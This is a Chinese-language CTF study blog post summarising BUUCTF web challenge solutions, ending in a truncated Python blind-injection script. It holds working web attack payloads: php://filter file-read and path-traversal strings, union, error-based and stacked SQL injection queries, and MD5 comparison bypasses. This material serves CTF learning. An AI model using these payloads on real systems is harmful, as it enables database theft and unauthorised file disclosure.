<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>K4oer'Blog | K4oer'Blog</title><meta name="author" content="K4oer"><meta name="copyright" content="K4oer"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="@TOC 前言1边刷题边总结些知识点，还在更新，冲！ 信息搜集1.dirsearch使用下载地址：https:&#x2F;&#x2F;github.com&#x2F;maurosoria&#x2F;dirsearch切换到安装目录 1py dirsearch.py -u 网址 -e 语言（一般用*） -u 指定url-e 指定网站语言 SQL缺省payload：*,1 查询语句：select *,1||flag from Flag 解题">
<meta property="og:type" content="article">
<meta property="og:title" content="K4oer&#39;Blog">
<meta property="og:url" content="http://k4oer.gitee.io/undefined/%E3%80%90BUUCTF%E5%88%B7%E9%A2%98%E3%80%91Web%E8%A7%A3%E9%A2%98%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80).html">
<meta property="og:site_name" content="K4oer&#39;Blog">
<meta property="og:description" content="@TOC 前言1边刷题边总结些知识点，还在更新，冲！ 信息搜集1.dirsearch使用下载地址：https:&#x2F;&#x2F;github.com&#x2F;maurosoria&#x2F;dirsearch切换到安装目录 1py dirsearch.py -u 网址 -e 语言（一般用*） -u 指定url-e 指定网站语言 SQL缺省payload：*,1 查询语句：select *,1||flag from Flag 解题">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
<meta property="article:published_time" content="2021-05-08T15:03:36.190Z">
<meta property="article:modified_time" content="2021-05-08T15:02:54.719Z">
<meta property="article:author" content="K4oer">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://k4oer.gitee.io/undefined/%E3%80%90BUUCTF%E5%88%B7%E9%A2%98%E3%80%91Web%E8%A7%A3%E9%A2%98%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80)"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'K4oer'Blog',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-05-08 23:02:54'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="K4oer'Blog" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">3</div></a></div></div></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">K4oer'Blog</a></span><div id="menus"><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">无题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-05-08T15:03:36.190Z" title="发表于 2021-05-08 23:03:36">2021-05-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-08T15:02:54.719Z" title="更新于 2021-05-08 23:02:54">2021-05-08</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>@<a href="%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95">TOC</a></p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">边刷题边总结些知识点，还在更新，冲！</span><br></pre></td></tr></table></figure>
<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>1.dirsearch使用<br>下载地址：<a target="_blank" rel="noopener" href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a><br>切换到安装目录</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py dirsearch.py -u 网址 -e 语言（一般用*）</span><br></pre></td></tr></table></figure>
<p>-u 指定url<br>-e 指定网站语言</p>
<h2 id="SQL缺省"><a href="#SQL缺省" class="headerlink" title="SQL缺省"></a>SQL缺省</h2><p>payload：*,1</p>
<p>查询语句：select *,1||flag from Flag</p>
<p>解题思路2：<br>payload:1;set sql_mode=PIPES_AS_CONCAT;select 1</p>
<p>解析：</p>
<p>在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接。<br>但在mysql 缺省不支持。需要调整mysql 的sql_mode<br>模式：pipes_as_concat 来实现oracle 的一些功能。</p>
<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>1.使用php伪协议读文件内容。使用filter过滤器</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
<p>例题：BUUCTFweb  Secret File<br><img src="https://img-blog.csdnimg.cn/20210305080601771.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>抓包</p>
<ol start="2">
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/leixiao-/p/10265150.html">phpmyadmin 4.8.1的一个远程文件包含的漏洞(CVE) </a><br>白名单验证：<br>例题：BUUCTF web warmup<br>示例代码如下：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> function <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">                echo <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            echo <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (! empty($_REQUEST[&#x27;file&#x27;])  ##不能为空</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;])  ##是字符串</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;])  ##上面checkfile返回为true</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        exit;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        echo <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
分析</li>
</ol>
<p>checkfile()函数<br>定义了一个白名单：source.php和hint.php，判断 $page是否为空、是否为字符串。<br>判断 $page是否在白名单里，若存在返回true；<br>考虑到page有参数的情况， $_page是取出 $page问号前的东西，然后再判断 $_page是否在白名单里，若存在则返回true；两个函数一个mb_substr和mb_strpos，总的意思就是截取变量page中?前面的字符串，然后再进行白名单校验。<br>之后是url二次编码问题，需要将?进行二次url编码<br>所以构造payload：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file=hint.php%<span class="number">253f</span>/../../../../../../../../ffffllllaaaagggg</span><br><span class="line">或者</span><br><span class="line">file=hint.php?file:<span class="comment">//../../../../../ffffllllaaaagggg</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">因为服务器会自动解一次码，所以 $page的值为hint.php%3f..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg，又一次url解码后，$_page的值为hint.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg,然后截取问号前面的hint.php判断在白名单里返回true。</span><br></pre></td></tr></table></figure>


<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="常规流程"><a href="#常规流程" class="headerlink" title="常规流程"></a>常规流程</h3><p>使用hackbar<br>1.判断是字符型还是数字型</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;or 1=1 #</span></span><br></pre></td></tr></table></figure>
<p>如果是整形，他的报错信息应为<br>“ ’ “ 那我们需要闭合，由于这个题目没有过滤任何sql注入的关键字，我们直接用 %23（#）来进行闭合sql语句</p>
<p>2.爆列数</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=<span class="number">1</span>&amp;password=<span class="number">11</span><span class="string">&#x27; order by 3%23  一般为3时有回显，字段数为3</span></span><br></pre></td></tr></table></figure>
<p>3.爆库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;1&amp;password&#x3D;11&#39; union select 1,version(),database()%23</span><br></pre></td></tr></table></figure>
<p>4.爆表名</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=<span class="number">123</span>&amp;password=<span class="number">111</span><span class="string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23</span></span><br></pre></td></tr></table></figure>
<p>5.爆表</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?username=<span class="number">1</span>&amp;&amp;password=<span class="number">1</span><span class="string">&#x27;union select 1,2,group_concat(id,username,password) from l0ve1ysq1 #</span></span><br><span class="line"><span class="string">或</span></span><br><span class="line"><span class="string">?username=1&amp;&amp;password=1&#x27;</span> union select <span class="number">1</span>,<span class="number">2</span>,group_concat(concat_ws(<span class="string">&#x27;-&#x27;</span>,id,username,password)) from l0ve1ysq1%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>ps:功能函数<br>1.concat_ws()函数<br> 功能：一次性指定分隔符<br> 语法：concat_ws(separator,str1,str2,…)<br> 说明：第一个参数指定分隔符 分隔符不能为空 如果为NULL 则返回值NULL<br> 2.concat()函数<br> 功能：将多个字符串拼接成一个字符串<br> 语法：concat(str1,str2,…)<br> 返回结果为连接参数产生的字符串 如果有任何一个参数为NULL 则返回值NULL<br> 3.group_concat( [DISTINCT] 要连接的字段 [Order BY 排序字段 ASC/DESC] [Separator ‘分隔符’] )<br> 即按需求打印内容</p>
<h3 id="BUUCTF-HardSQL"><a href="#BUUCTF-HardSQL" class="headerlink" title="BUUCTF HardSQL"></a>BUUCTF HardSQL</h3><p>一个字符一个字符试发现很多字符如and,union都被过滤<br>因为空格被过滤，用()分割语句达到代替空格的效果。=被过滤，可以用like替代。尝试用<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37873738/article/details/88042610">updatexml报错注入</a></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">check.php?username=<span class="number">1</span><span class="string">&#x27;or(updatexml(1,concat(0x7e,database(),0x7e),1))%23&amp;password=2</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>爆出库名<br><img src="https://img-blog.csdnimg.cn/20210405152829188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
<li><p>爆表名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">check.php?username&#x3D;1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(database()))),0x7e),1))%23&amp;password&#x3D;2</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210405153605334.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
<li><p> 爆列名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">check.php?username&#x3D;1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&#39;H4rDsq1&#39;))),0x7e),1))%23&amp;password&#x3D;2</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210405153808773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
<li><p>因为updataxml限制语句为32位，而flag长度大于32位，所以用left和right函数拼接</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">前半部分 check.php?username=<span class="number">1</span><span class="string">&#x27;or(updatexml(1,concat(0x7e,(select((left(password,30)))from(H4rDsq1)),0x7e),1))%23&amp;password=2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">后半部分 ![check.php?username=1&#x27;</span>or(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select((right(password,<span class="number">30</span>)))from(H4rDsq1)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span>&amp;password=<span class="number">2</span>](https:<span class="comment">//img-blog.csdnimg.cn/20210405154340430.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210405154333435.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2021040515442494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>参考文章：【extractvalue报错注入】<a target="_blank" rel="noopener" href="https://blog.csdn.net/qin9800/article/details/113446035">https://blog.csdn.net/qin9800/article/details/113446035</a>  </p>
<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>在SQL中，分号（;）是用来表示一条sql语句的结束。<br>而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>
<p>查看表的语句，在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符</p>
<p>1’;desc <code>1919810931114514</code>;</p>
<p>知识点1：堆叠注入<br>在SQL中，分号是用来表示一条sql语句的结束。如果在 ; 结束一个sql语句后继续构造下一条语句，效果就是分别执行两条sql语句。由于两条语句堆叠在同一行，而不是原本应该各自占据一行，所以这种注入成为堆叠注入。</p>
<p>知识点2<br>当数字型字符作为字段、表、库名查询时，应该用反单引号括起来</p>
<p>mysql预处理语句</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PREPARE sqla from <span class="string">&#x27;[my sql sequece]&#x27;</span>;  	 预定义SQL语句</span><br><span class="line">EXECUTE sqla; 							 执行预定义SQL语句</span><br><span class="line">(DEALLOCATE || DROP) PREPARE sqla;  	 删除预定义SQL语句</span><br></pre></td></tr></table></figure>

<p>通过变量进行传递<br>SET @tn = ‘flag’;                      存储表名<br>SET @sql = concat(‘select * from ‘, @tn);          存储SQL语句<br>PREPARE sqla from @sql;           预定义SQL语句<br>EXECUTE sqla;                  执行预定义SQL语句<br>(DEALLOCATE || DROP) PREPARE sqla;      删除预定义SQL语句</p>
<p>PREPARE语句准备好一条SQL语句，并分配给这条SQL语句一个名字供之后调用。<br>准备好的SQL语句通过EXECUTE命令执行，通过DEALLOCATE PREPARE命令释放掉。</p>
<h3 id="使用MD5函数实现sql注入"><a href="#使用MD5函数实现sql注入" class="headerlink" title="使用MD5函数实现sql注入"></a>使用MD5函数实现sql注入</h3><p>BUUCTF easy MD5<br>1.知识点：<br>（1）MD5函数在加密ffifdyop后返回原始字符串’or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c  ，另外mysql中以数字开头的字符串会被当做整形处理例如‘6abc’=6。<br>（2）md5绕过：因为md5不能处理数组，会返回NULL，因为NULL=NULL，可以实现绕过，传入数组，使得 md5 处理两个参数都返回 0 即可： payload:?a[]=1&amp;b[]=2<br>或者传入两个md5处理后以0e开头的字符串</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">下列的字符串的MD5值都是0e开头的：</span><br><span class="line">QNKCDZO</span><br><span class="line"><span class="number">240610708</span></span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line">s214587387a</span><br></pre></td></tr></table></figure>
<p>2.解题<br>随便输入后抓包发现Hint中有提示<br><img src="https://img-blog.csdnimg.cn/2021032819425783.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>利用md5特性传入ffifdyop，使得select语句为：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from <span class="string">&#x27;admin&#x27;</span> where password=<span class="string">&#x27; &#x27;</span>or <span class="string">&#x27;6&#x27;</span></span><br></pre></td></tr></table></figure>
<p>这样就相当于sql语句为永真实现注入<br>得到<br><img src="https://img-blog.csdnimg.cn/2021032819454254.png" alt="在这里插入图片描述"><br>访问页面发现了php页面<br><img src="https://img-blog.csdnimg.cn/20210328194640825.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>利用md5绕过得到<br><img src="https://img-blog.csdnimg.cn/20210328194802705.png" alt="在这里插入图片描述"><br>访问页面同样为一个md5绕过的php页面，易得flag</p>
<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h4 id="BUUCTF-WEB-CISCN2019-华北赛区-Day2-Web1-Hack-World-SQL盲注，PHP）"><a href="#BUUCTF-WEB-CISCN2019-华北赛区-Day2-Web1-Hack-World-SQL盲注，PHP）" class="headerlink" title="BUUCTF WEB [CISCN2019 华北赛区 Day2 Web1]Hack World(SQL盲注，PHP）"></a>BUUCTF WEB [CISCN2019 华北赛区 Day2 Web1]Hack World(SQL盲注，PHP）</h4><ul>
<li><p>题目描述:<br><img src="https://img-blog.csdnimg.cn/20210331144544929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM0NTA1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
<li><p>已知表名和列名，并且发现过滤了很多sql字符，尝试注入</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>^(ascii(substr((select(flag)<span class="keyword">from</span>(flag)),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">1</span>)^<span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>奉上大佬脚本</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://f0c8caf0-fc27-454e-83bc-a557d1891b94.node3.buuoj.cn/index.php&quot;</span></span><br><span class="line">temp = &#123;<span class="string">&quot;id&quot;</span> : <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    time.sleep(<span class="number">0.06</span>)</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high =<span class="number">128</span></span><br><span class="line">    mid = (low+high)<span class="comment">//2</span></span><br><span class="line">    <span class="keyword">while</span>(low&lt;high):</span><br><span class="line">        temp[<span 